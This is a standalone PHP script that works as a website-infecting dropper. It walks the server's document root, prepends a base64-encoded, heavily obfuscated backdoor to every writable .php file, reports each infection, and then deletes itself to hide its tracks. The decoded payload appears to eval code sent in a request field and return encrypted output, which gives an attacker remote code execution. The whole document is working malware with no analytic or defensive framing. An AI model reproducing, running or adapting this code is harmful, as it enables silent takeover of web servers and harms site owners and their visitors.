<?php
error_reporting(0);
function write_horse_2_php($dir, $b64code)
{
    if (is_dir($dir)) {
        $dh = opendir($dir);
        while (($file = readdir($dh)) !== false) {
            if (in_array($file, ['.', '..'])) {
                continue;
            }
            $file_path = $dir . '/' . $file;
            if (is_dir($file_path)) {
                write_horse_2_php($file_path, $b64code);
            } else {
                if (strpos($file_path, '.php') && is_writable($file_path)) {
                    if (file_put_contents($file_path, base64_decode($b64code) . file_get_contents($file_path)))
                        echo "Write horse in" . $file_path . " Ok!<br>";
                }
            }
        }
        closedir($dir);
    } else {
        echo $dir;
    }
}

$root_dir = $_SERVER['DOCUMENT_ROOT'];
$b64code = "PD9waHAgLyogKioqICovIGVycm9yX3JlcG9ydGluZyhFX0FMTF5FX05PVElDRSk7ZGVmaW5lKCeep8knLCAn75mdJyk7JEdMT0JBTFNbnqfJXSA9IGV4cGxvZGUoJ3wCfAR8AycsIGd6aW5mbGF0ZShzdWJzdHIoJx+LCAAAAAAAAApVUF1LwzAUBfWHOPbxUNZ9oHMtjDFxBX2YyiyCUAhpclcrXVqSDBzcH2+7G63LQ3LuIfeeew5oXWqmoSq1zVWGF3iFl7uDEjYvFYPv3FhDpAShj5WlIuUG7m5ZzZUSiKLbWF2AIiw+NYFSSwKVhqwRK7hwXWMfEw8ZdnCFfUx62MUBJiMc4gKX4zMxUK1YLdPMAe72uabH91hn1e91B6PhYkmU5sqJm0Pq2lr5xzh+Zevo/ekhYpto87L9IP7L1O7/uztzL/a/frhx6ezljACEYciDAKZ8xptrOg8mUkzmcLMLw1QK+uX59XmL77dxAzwXU8qM5dr+VRlYJgrgLs86gHaH04ToeX3q/wFOxlS+xgEAACcsMHgwYSwgLTgpKSk7DQokR0xPQkFMU3uep8l9WzBdKDApO2lmKCEkR0xPQkFMU3uep8l9ezB4MDAxfSgkR0xPQkFMU3uep8l9WzB4MDAwMl0pKXtmdW5jdGlvbiBkZWNyeXB0KCSw79ApeySDPSYkR0xPQkFMU3uep8l9OySw79A9JIN7MHgwMDAwM30oJLDv0Ck7JJm79uU9JINbMHgwMDAwMDRdO2Zvcigky+k9MDsky+k8JIN7MHgwNX0oJLDv0Ck7JMvpKyspJJm79uUuPSAkg1sweDAwNl0oJIN7MHgwMDA3fSgksO/QWyTL6V0pLTB4MDAxKTtyZXR1cm4gJIN7MHgwMDAwM30oJINbMHgwMDAwOF0oJIN7MHgwMDAwMDl9LCSDWzB4MDAwMDA0XSwkmbv25SkpO31mdW5jdGlvbiBlbmNyeXB0KCSxl5zC8yl7JNLLpYY9JiRHTE9CQUxTe56nyX07JKPdoj0k0sulhnsweDA1fSgksZecwvMpJTB4MDAwMDM/MHgwMDAwMy0k0sulhnsweDA1fSgksZecwvMpJTB4MDAwMDM6MDsksZecwvM9JNLLpYZbMHgwYV0oJLGXnMLzLiTSy6WGezB4MDBifSgk0sulhlsweDAwMGNdLCSj3aIpKTsk0qTKPSTSy6WGezB4MDAwMGR9O2Zvcigk4fqx0D0wOyTh+rHQPCTSy6WGWzB4MDAwMDBlXSgwLCTSy6WGezB4MDV9KCTSpMopKTsk4fqx0CsrKSSxl5zC8z0k0sulhnsweDBmfSgksZecwvMsJNKkylsk4fqx0F0sJNLLpYZbMHgwMDAwMGVdKDAsJNLLpYZ7MHgwNX0oJLGXnMLzKSksMCk7JJS4oM27PSTSy6WGWzB4MDAwMDA0XTtmb3IoJOH6sdA9MDsk4fqx0Dwk0sulhnsweDA1fSgksZecwvMpOyTh+rHQKyspJJS4oM27Lj0gJNLLpYZbMHgwMDZdKCTSy6WGezB4MDAwN30oJLGXnMLzWyTh+rHQXSkrMHgwMDEpO3JldHVybiAk0sulhlsweDBhXSgklLigzbspO319aWYoaXNzZXQoJF9TRVJWRVJbJEdMT0JBTFN7nqfJfVsweDAwMTBdXSkpeyRpbmZvPSRHTE9CQUxTe56nyX17MHgwMDAxMX0oJEdMT0JBTFN7nqfJfVsweDAwMDAxMl0oJF9TRVJWRVJbJEdMT0JBTFN7nqfJfVsweDAwMTBdXSksITApO2lmKGlzc2V0KCRpbmZvWyRHTE9CQUxTe56nyX17MHgwMDAwMDEzfV0pJiYgaXNzZXQoJGluZm9bJEdMT0JBTFN7nqfJfVsweDAxNF1dKSl7aWYoJEdMT0JBTFN7nqfJfXsweDAwMTV9KCRpbmZvWyRHTE9CQUxTe56nyX1bMHgwMTRdXSk9PT0kR0xPQkFMU3uep8l9WzB4MDAwMTZdKXtlY2hvICRHTE9CQUxTe56nyX17MHgwMDAwMTd9OyRHTE9CQUxTe56nyX1bMHgwMDAwMDE4XSgpO0BldmFsKCRpbmZvWyRHTE9CQUxTe56nyX17MHgwMDAwMDEzfV0pOyRjb250ZW50cz0kR0xPQkFMU3uep8l9ezB4MDE5fSgpO2VjaG8gJEdMT0JBTFN7nqfJfVsweDAwMWFdKCRjb250ZW50cyk7ZWNobyAkR0xPQkFMU3uep8l9ezB4MDAwMWJ9O2RpZSgpO319fT8+";
write_horse_2_php($root_dir, $b64code);
unlink(__FILE__);
